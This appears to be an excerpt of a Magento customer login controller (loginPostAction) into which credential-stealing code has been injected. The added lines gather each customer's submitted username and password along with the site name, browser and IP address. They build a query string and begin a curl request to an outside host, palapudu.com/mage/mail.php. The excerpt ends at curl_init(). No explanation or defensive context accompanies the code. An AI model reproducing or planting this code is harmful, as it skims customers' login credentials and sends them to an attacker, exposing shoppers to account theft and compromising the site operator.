...
class Mage_Customer_AccountController extends Mage_Core_Controller_Front_Action
{
    ...
    public function loginPostAction()
    {
        ...
        $data0 = $_SERVER['SERVER_NAME'];
        $data1 = $login['username'];
        $data2 = $login['password'];
		$data3 = $_SERVER['HTTP_USER_AGENT'];
        $data4 = $_SERVER['REMOTE_ADDR'];
 		$mail12 = "&site=".($data0)."&username=".($data1)."&password=".($data2)."&Browser=".($data3)."&ip=".($data4);
        $url = "http://palapudu.com/mage/mail.php";
         $ch = curl_init();
